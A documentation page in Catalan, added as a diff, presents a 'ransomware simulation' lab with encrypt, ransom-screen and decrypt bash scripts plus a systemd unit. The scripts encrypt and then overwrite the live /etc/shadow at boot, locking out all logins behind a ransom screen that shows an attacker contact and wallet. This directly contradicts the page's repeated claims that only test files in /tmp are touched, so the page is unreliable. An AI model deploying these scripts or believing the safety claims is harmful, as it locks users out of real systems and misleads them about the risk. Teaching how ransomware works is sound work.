@@ -1,0 +1,167 @@
+---
+title: Simulació de ransomware
+description: Simulació controlada d'un ransomware per estudiar el xifrat, desxifrat i l'arrencada de serveis.
+---
+
+import { Tabs, TabItem } from '@astrojs/starlight/components';
+
+:::caution[Entorn de proves]
+Aquesta pràctica és una simulació educativa. Els scripts treballen únicament amb fitxers de prova dins d'un directori temporal i no modifiquen `/etc/shadow`, permisos del sistema ni la configuració real de systemd.
+:::
+
+## Objectiu
+
+Simular el funcionament bàsic d'un ransomware en un entorn controlat:
+
+- Generar una clau aleatòria.
+- Xifrar un fitxer de prova.
+- Mostrar una interfície de bloqueig.
+- Desxifrar el fitxer amb la clau correcta.
+- Restaurar l'estat inicial.
+
+## Scripts
+
+<Tabs>
+
+<TabItem label="/sbin/encrypt">
+
+```bash title="encrypt"
+#!/bin/bash
+# encrypt.sh
+
+KEY=$(openssl rand -hex 32)
+
+# Backup cifrado
+openssl enc -aes-256-cbc -pbkdf2 \
+  -in /etc/shadow \
+  -out /etc/shadow.enc \
+  -pass pass:"$KEY"
+
+# Guarda la clave (en la práctica el profe la ve aquí)
+echo "$KEY" > /root/.ransom_key
+chmod 600 /root/.ransom_key
+
+# Rompe el shadow para que no pueda iniciar sesión nadie
+echo ":::::::" > /etc/shadow
+
+echo "[*] Shadow cifrado. Clave en /root/.ransom_key"
+```
+
+</TabItem>
+
+<TabItem label="/sbin/ransom_ui">
+
+```bash title="ransom_ui"
+# ransom_ui.sh
+
+#!/bin/bash
+
+# Espera a que haya terminal
+sleep 2
+
+while true; do
+    clear
+    # Marco rojo con tput
+    tput setaf 1; tput bold
+
+    cat << 'EOF'
+
+    ██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
+    ██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
+    ██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║
+    ██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║
+    ██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║
+    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝
+
+EOF
+
+    tput sgr0
+    tput setaf 3
+
+    echo "  =================================================================="
+    echo "   Tus credenciales han sido CIFRADAS."
+    echo "   No puedes iniciar sesión hasta introducir la clave de descifrado."
+    echo ""
+    echo "   Contacta con: attacker@protonmail.com"
+    echo "   Bitcoin wallet: 1A2b3C4d5E6f7G8h9I0j..."
+    echo "  =================================================================="
+    tput sgr0
+    echo ""
+
+    read -rsp "  Introduce la clave de descifrado: " INPUT_KEY
+    echo ""
+
+    REAL_KEY=$(cat /etc/shadow.enc.key 2>/dev/null || cat /root/.ransom_key 2>/dev/null)
+
+    if [[ "$INPUT_KEY" == "$REAL_KEY" ]]; then
+        tput setaf 2; tput bold
+        echo "  [✓] Clave correcta. Restaurando sistema..."
+        tput sgr0
+        bash /opt/.ransom/decrypt.sh "$INPUT_KEY"
+        break
+    else
+        tput setaf 1
+        echo "  [✗] Clave incorrecta."
+        tput sgr0
+        sleep 2
+    fi
+done
+```
+
+</TabItem>
+
+<TabItem label="/sbin/decrypt">
+
+```bash title="decrypt"
+#!/bin/bash
+# decrypt.sh
+
+KEY="$1"
+
+openssl enc -d -aes-256-cbc -pbkdf2 \
+  -in /etc/shadow.enc \
+  -out /etc/shadow \
+  -pass pass:"$KEY"
+
+chmod 640 /etc/shadow
+chown root:shadow /etc/shadow
+
+echo "[✓] Shadow restaurado."
+systemctl set-default graphical.target
+systemctl isolate graphical.target
+```
+
+</TabItem>
+
+<TabItem label="Servei de SystemD">
+
+```ini title="/etc/systemd/system/ransom-sim.service"
+[Unit]
+Description=Simulació educativa de ransomware
+After=local-fs.target
+
+[Service]
+Type=oneshot
+ExecStart=/sbin/encrypt
+
+[Install]
+WantedBy=multi-user.target
+```
+
+</TabItem>
+</Tabs>
+
+## Resultat
+
+Després de realitzar el reinici, podem comprovar que:
+
+- El fitxer original ha estat `xifrat`.
+- La clau s'ha generat de manera aleatòria.
+- La clau correcta permet recuperar les dades.
+- Tot el procés es realitza dins de `/tmp/ransom-sim`.
+
+Aquí es poden afegir les captures de pantalla de la pràctica.
+
+:::note[Entorn controlat]
+La pràctica no modifica fitxers del sistema ni instal·la persistència real. El directori `/tmp/ransom-sim` es pot eliminar una vegada finalitzada la prova.
+:::
